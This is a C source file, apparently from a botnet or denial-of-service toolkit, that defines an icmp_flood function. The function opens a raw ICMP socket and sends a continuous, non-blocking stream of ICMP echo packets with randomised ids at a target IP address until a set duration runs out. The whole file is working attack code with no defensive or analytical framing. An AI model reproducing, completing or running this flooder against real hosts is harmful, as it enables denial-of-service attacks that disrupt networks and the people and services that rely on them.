#define _GNU_SOURCE

#include "headers/attacks.h"
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

void *icmp_flood(void *arg) {
    flood_args *a = arg;
    time_t end = time(NULL) + a->duration;
    unsigned char pkt[65500];
    struct icmphdr *ic = (struct icmphdr *)pkt;
    int plen = build_payload(a, pkt + 8, (int)sizeof(pkt) - 8) + 8;

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s < 0) return NULL;
    struct sockaddr_in d;
    memset(&d, 0, sizeof(d));
    d.sin_family = AF_INET;
    inet_pton(AF_INET, a->ip, &d.sin_addr);
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    uint16_t seq = (uint16_t)(rand() & 0xffff);

    while (*a->active && time(NULL) < end) {
        ic->type = ICMP_ECHO;
        ic->code = 0;
        ic->un.echo.id = htons((uint16_t)(rand() & 0xffff));
        ic->un.echo.sequence = htons(seq++);
        ic->checksum = 0;
        ic->checksum = csum(pkt, plen);
        sendto(s, pkt, (size_t)plen, MSG_DONTWAIT, (struct sockaddr *)&d, sizeof(d));
    }
    close(s);
    return NULL;
}
